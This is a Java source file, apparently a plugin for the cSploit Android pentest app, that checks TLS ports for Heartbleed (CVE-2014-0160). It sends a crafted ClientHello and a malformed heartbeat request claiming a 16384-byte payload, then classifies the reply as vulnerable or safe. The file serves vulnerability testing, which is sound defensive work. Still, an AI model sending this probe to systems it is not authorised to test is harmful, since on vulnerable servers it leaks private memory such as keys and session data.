package org.csploit.android.plugins;

import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;

import androidx.core.content.ContextCompat;

import com.google.android.material.floatingactionbutton.FloatingActionButton;

import org.csploit.android.BuildConfig;
import org.csploit.android.R;
import org.csploit.android.core.Plugin;
import org.csploit.android.core.System;
import org.csploit.android.helpers.AnimationHelper;
import org.csploit.android.helpers.ThreadHelper;
import org.csploit.android.net.Target;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicBoolean;

public class HeartbleedChecker extends Plugin {

    // --------------- result model ---------------
    public static class HeartbleedResult {
        public enum Kind { INFO, SAFE, VULN }
        public Kind kind;
        public String label;
        public String value;

        public HeartbleedResult(Kind kind, String label, String value) {
            this.kind = kind;
            this.label = label;
            this.value = value;
        }
    }

    private static final int[] PORTS = {443, 8443, 465, 993};

    // --------------- adapter ---------------
    private class HBAdapter extends ArrayAdapter<HeartbleedResult> {
        HBAdapter(List<HeartbleedResult> items) {
            super(HeartbleedChecker.this, R.layout.plugin_heartbleed_checker_item, items);
        }

        @Override
        public View getView(int position, View convertView, android.view.ViewGroup parent) {
            if (convertView == null) {
                convertView = getLayoutInflater().inflate(R.layout.plugin_heartbleed_checker_item, parent, false);
            }
            HeartbleedResult r = getItem(position);
            TextView labelView = convertView.findViewById(R.id.heartbleedItemLabel);
            TextView valueView = convertView.findViewById(R.id.heartbleedItemValue);
            if (r != null) {
                labelView.setText(r.label);
                valueView.setText(r.value);
                int color;
                switch (r.kind) {
                    case VULN: color = 0xFFD32F2F; break;
                    case SAFE: color = 0xFF388E3C; break;
                    default:   color = ContextCompat.getColor(HeartbleedChecker.this, R.color.app_color); break;
                }
                labelView.setTextColor(color);
            }
            return convertView;
        }
    }

    // --------------- fields ---------------
    private FloatingActionButton mFab;
    private View mProgress;
    private ListView mList;
    private final List<HeartbleedResult> mResults = new ArrayList<>();
    private HBAdapter mAdapter;
    private Future<?> mJob;
    private final AtomicBoolean mRunning = new AtomicBoolean(false);

    // --------------- constructor ---------------
    public HeartbleedChecker() {
        super(R.string.heartbleed_checker, R.string.heartbleed_checker_desc,
                new Target.Type[]{Target.Type.ENDPOINT, Target.Type.REMOTE},
                R.layout.plugin_heartbleed_checker, R.drawable.action_scanner);
    }

    // --------------- lifecycle ---------------
    @Override
    public void onCreate(Bundle savedInstanceState) {
        SharedPreferences prefs = getSharedPreferences("THEME", MODE_PRIVATE);
        int theme = prefs.getInt("theme", R.style.AppTheme);
        setTheme(theme);

        super.onCreate(savedInstanceState);

        mFab = findViewById(R.id.heartbleedToggleButton);
        mProgress = findViewById(R.id.heartbleedActivity);
        mList = findViewById(android.R.id.list);

        mAdapter = new HBAdapter(mResults);
        mList.setAdapter(mAdapter);

        mFab.setOnClickListener(v -> {
            if (mRunning.get()) {
                stopScan();
            } else {
                startScan();
            }
        });
    }

    @Override
    public void onBackPressed() {
        stopScan();
        super.onBackPressed();
        overridePendingTransition(R.anim.fadeout, R.anim.fadein);
    }

    // --------------- scan control ---------------
    private void startScan() {
        mRunning.set(true);
        mResults.clear();
        mAdapter.notifyDataSetChanged();
        mProgress.setVisibility(View.VISIBLE);
        mFab.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_stop_24dp));

        String ip = System.getCurrentTarget().getAddress().getHostAddress();

        if (BuildConfig.DEBUG) {
            emitDebug();
            stopScan();
            return;
        }

        mJob = ThreadHelper.submit(() -> {
            try {
                scan(ip);
            } catch (Exception ignored) {
            } finally {
                runOnUiThread(this::stopScan);
            }
        });
    }

    private void stopScan() {
        mRunning.set(false);
        if (mJob != null && !mJob.isDone()) {
            mJob.cancel(true);
        }
        runOnUiThread(() -> {
            mProgress.setVisibility(View.GONE);
            mFab.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_play_arrow_24dp));
        });
    }

    // --------------- debug ---------------
    private void emitDebug() {
        addResult(new HeartbleedResult(HeartbleedResult.Kind.VULN,
                "Heartbleed (CVE-2014-0160)",
                "Port 443 returned heartbeat response — memory leakage possible"));
        addResult(new HeartbleedResult(HeartbleedResult.Kind.INFO, "Port 443", "TLS 1.2 detected"));
        addResult(new HeartbleedResult(HeartbleedResult.Kind.INFO, "Port 8443", "Not open"));
    }

    // --------------- core logic ---------------
    private void scan(String ip) {
        for (int port : PORTS) {
            if (!mRunning.get()) break;
            probePort(ip, port);
        }
    }

    private void probePort(String ip, int port) {
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(ip, port), 5000);
            socket.setSoTimeout(5000);
            OutputStream out = socket.getOutputStream();
            InputStream in = socket.getInputStream();

            // Send TLS ClientHello with heartbeat extension
            byte[] hello = buildClientHello();
            out.write(hello);
            out.flush();

            // Read ServerHello response(s)
            byte[] buf = new byte[4096];
            int totalRead = 0;
            boolean gotServerHello = false;
            long deadline = java.lang.System.currentTimeMillis() + 4000;

            while (java.lang.System.currentTimeMillis() < deadline && totalRead < buf.length) {
                int n = in.read(buf, totalRead, buf.length - totalRead);
                if (n < 0) break;
                totalRead += n;
                // Check for ServerHello (content_type=22, handshake type 2)
                if (totalRead >= 6 && buf[0] == 0x16) {
                    gotServerHello = true;
                    break;
                }
            }

            if (!gotServerHello) {
                addResult(new HeartbleedResult(HeartbleedResult.Kind.INFO,
                        "Port " + port, "No TLS ServerHello received"));
                return;
            }

            addResult(new HeartbleedResult(HeartbleedResult.Kind.INFO,
                    "Port " + port,
                    "TLS detected — version 0x" + String.format("%02x%02x", buf[1], buf[2])));

            // Send malformed Heartbeat request (CVE-2014-0160 payload)
            byte[] hbReq = {
                0x18,       // content type: heartbeat (24)
                0x03, 0x02, // TLS 1.1
                0x00, 0x03, // record length=3
                0x01,       // heartbeat_type=request
                0x40, 0x00  // payload_length=16384 (much more than actual payload)
            };
            out.write(hbReq);
            out.flush();

            // Wait for response
            byte[] hbBuf = new byte[16384 + 100];
            int hbRead = 0;
            long hbDeadline = java.lang.System.currentTimeMillis() + 3000;

            while (java.lang.System.currentTimeMillis() < hbDeadline && hbRead < 5) {
                int n = in.read(hbBuf, hbRead, hbBuf.length - hbRead);
                if (n < 0) break;
                hbRead += n;
            }

            if (hbRead >= 5 && hbBuf[0] == 0x18) {
                // Got heartbeat response
                int respLen = ((hbBuf[3] & 0xFF) << 8) | (hbBuf[4] & 0xFF);
                if (respLen > 3) {
                    addResult(new HeartbleedResult(HeartbleedResult.Kind.VULN,
                            "Heartbleed (CVE-2014-0160)",
                            "Port " + port + " returned " + respLen + " bytes of memory data"));
                } else {
                    addResult(new HeartbleedResult(HeartbleedResult.Kind.SAFE,
                            "Port " + port, "Heartbeat responded correctly — not vulnerable"));
                }
            } else if (hbRead > 0 && hbBuf[0] == 0x15) {
                // Alert — server rejected heartbeat
                addResult(new HeartbleedResult(HeartbleedResult.Kind.SAFE,
                        "Port " + port, "TLS Alert received — heartbeat rejected, not vulnerable"));
            } else {
                addResult(new HeartbleedResult(HeartbleedResult.Kind.SAFE,
                        "Port " + port, "No heartbeat response — likely not vulnerable"));
            }

        } catch (java.net.ConnectException e) {
            addResult(new HeartbleedResult(HeartbleedResult.Kind.INFO,
                    "Port " + port, "Not open"));
        } catch (Exception e) {
            addResult(new HeartbleedResult(HeartbleedResult.Kind.INFO,
                    "Port " + port, "Error: " + e.getMessage()));
        }
    }

    // --------------- TLS ClientHello builder ---------------
    private byte[] buildClientHello() {
        // Minimal TLS 1.0 ClientHello with Heartbeat extension
        // Random: 32 bytes of zeros (for simplicity)
        byte[] random = new byte[32];

        byte[] extensions = new byte[]{
            // Heartbeat extension: type=0x000f, length=1, mode=1 (peer_allowed_to_send)
            0x00, 0x0f, 0x00, 0x01, 0x01,
            // Server Name Indication placeholder (empty)
            // Renegotiation Info
            (byte)0xFF, 0x01, 0x00, 0x01, 0x00
        };

        int extLen = extensions.length;
        // Cipher suites: TLS_RSA_WITH_AES_128_CBC_SHA (0x002F), TLS_RSA_WITH_AES_256_CBC_SHA (0x0035)
        byte[] ciphers = {0x00, 0x2F, 0x00, 0x35, 0x00, 0x0A};
        int cipherLen = ciphers.length;

        // ClientHello body length
        // version(2) + random(32) + session_id_len(1) + cipher_suites_len(2) + ciphers +
        // compression_methods_len(1) + null(1) + extensions_len(2) + extensions
        int chBodyLen = 2 + 32 + 1 + 2 + cipherLen + 1 + 1 + 2 + extLen;

        // Handshake header: type(1) + length(3)
        int hsLen = 1 + 3 + chBodyLen;

        // TLS record: content_type(1) + version(2) + length(2) + handshake
        byte[] record = new byte[5 + hsLen];
        int i = 0;

        // TLS record header
        record[i++] = 0x16; // content_type = handshake
        record[i++] = 0x03; record[i++] = 0x01; // version TLS 1.0
        int recordBodyLen = hsLen;
        record[i++] = (byte)(recordBodyLen >> 8);
        record[i++] = (byte)(recordBodyLen);

        // Handshake header
        record[i++] = 0x01; // ClientHello
        record[i++] = (byte)(chBodyLen >> 16);
        record[i++] = (byte)(chBodyLen >> 8);
        record[i++] = (byte)(chBodyLen);

        // ClientHello version TLS 1.2
        record[i++] = 0x03; record[i++] = 0x03;
        // Random
        java.lang.System.arraycopy(random, 0, record, i, 32); i += 32;
        // Session ID len = 0
        record[i++] = 0x00;
        // Cipher suites
        record[i++] = (byte)(cipherLen >> 8);
        record[i++] = (byte)(cipherLen);
        java.lang.System.arraycopy(ciphers, 0, record, i, cipherLen); i += cipherLen;
        // Compression: 1 method, null
        record[i++] = 0x01; record[i++] = 0x00;
        // Extensions length
        record[i++] = (byte)(extLen >> 8);
        record[i++] = (byte)(extLen);
        java.lang.System.arraycopy(extensions, 0, record, i, extLen);

        return record;
    }

    // --------------- helpers ---------------
    private void addResult(HeartbleedResult result) {
        runOnUiThread(() -> {
            mResults.add(result);
            mAdapter.notifyDataSetChanged();
        });
    }
}
